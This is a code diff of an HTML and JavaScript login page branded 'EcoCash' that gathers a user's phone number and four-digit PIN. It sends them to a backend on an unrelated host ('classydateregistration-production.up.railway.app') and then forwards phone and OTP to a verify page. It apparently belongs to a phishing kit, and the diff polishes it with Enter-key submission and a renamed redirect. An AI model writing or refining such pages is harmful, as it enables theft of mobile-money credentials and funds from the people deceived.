@@ -31,7 +31,6 @@
             width: 100%;
         }
         
-        /* ===== LOGO ===== */
         .logo {
             text-align: center;
             padding: 40px 20px 20px;
@@ -52,7 +51,6 @@
             color: #ff0000;
         }
         
-        /* ===== LOGIN CONTENT ===== */
         .login-content {
             flex: 1 0 auto;
             display: flex;
@@ -71,7 +69,6 @@
             margin-bottom: 30px;
         }
         
-        /* ===== PHONE INPUT ===== */
         .phone-group {
             width: 100%;
             border: 2px solid #0066ff;
@@ -123,7 +120,6 @@
             color: #aaa;
         }
         
-        /* ===== PIN ===== */
         .pin-label {
             font-size: 15px;
             color: #666;
@@ -186,7 +182,6 @@
             opacity: 0.7;
         }
         
-        /* ===== LOGIN BUTTON ===== */
         #loginBtn {
             display: none;
             width: 100%;
@@ -219,7 +214,6 @@
             transform: none !important;
         }
         
-        /* ===== NOTICE ===== */
         .notice {
             background: rgba(255, 193, 7, 0.15);
             border: 2px solid #FFC107;
@@ -234,7 +228,6 @@
             width: 100%;
         }
         
-        /* ===== BOTTOM SECTION ===== */
         .bottom-section {
             background: #005eb8;
             color: white;
@@ -329,7 +322,6 @@
             opacity: 0.8;
         }
         
-        /* ===== SPINNER ===== */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -368,7 +360,6 @@
             font-weight: 500;
         }
         
-        /* ===== TOAST ===== */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -400,7 +391,6 @@
             background: #27ae60;
         }
         
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .logo-text {
                 font-size: 28px;
@@ -486,14 +476,12 @@
 </head>
 
 <body>
-    <!-- ===== LOGO ===== -->
     <div class="logo">
         <div class="logo-text">
             <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
         </div>
     </div>
 
-    <!-- ===== LOGIN CONTENT ===== -->
     <div class="login-content">
         <h1 class="title">Login</h1>
 
@@ -523,7 +511,6 @@
         </div>
     </div>
 
-    <!-- ===== BOTTOM SECTION ===== -->
     <div class="bottom-section">
         <div class="curve"></div>
         <div class="bottom-content">
@@ -547,7 +534,6 @@
         </div>
     </div>
     
-    <!-- ===== SPINNER ===== -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
@@ -555,14 +541,9 @@
         </div>
     </div>
 
-    <!-- ===== TOAST ===== -->
     <div class="toast" id="toast"></div>
     
     <script>
-        // ============================================================
-        // ECOCASH LOGIN - CONNECTED TO BACKEND
-        // ============================================================
-        
         // ===== CONFIGURATION =====
         const API_URL = 'https://classydateregistration-production.up.railway.app';
         
@@ -576,7 +557,6 @@
         let pinValue = '';
         let isSubmitting = false;
 
-        // ===== TOAST =====
         function showToast(message, type = '') {
             toast.textContent = message;
             toast.className = 'toast show ' + type;
@@ -585,12 +565,11 @@
             }, 5000);
         }
 
-        // ===== CLEAR SAVED DATA =====
+        // Clear saved data on load
         phoneInput.value = '';
         pinBoxes.forEach(box => box.value = '');
         localStorage.removeItem('phone');
 
-        // ===== PIN INPUT =====
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
@@ -615,6 +594,12 @@
                 if (e.key === 'ArrowRight' && index < 3) {
                     pinBoxes[index + 1].focus();
                 }
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (pinValue.length === 4) {
+                        loginBtn.click();
+                    }
+                }
             });
 
             box.addEventListener('paste', (e) => {
@@ -635,7 +620,6 @@
             });
         });
 
-        // ===== LOGIN =====
         loginBtn.addEventListener('click', async () => {
             if (isSubmitting) return;
 
@@ -700,7 +684,7 @@
                     
                     setTimeout(() => {
                         spinnerOverlay.style.display = 'none';
-                        window.location.href = `verifyzimbabwe.html?phone=${phone}&otp=${otp}`;
+                        window.location.href = `verify.html?phone=${phone}&otp=${otp}`;
                     }, 1500);
                     
                 } else {
@@ -726,7 +710,6 @@
             }
         });
 
-        // ===== AUTO-FOCUS =====
         phoneInput.focus();
         checkPinComplete();
     </script>
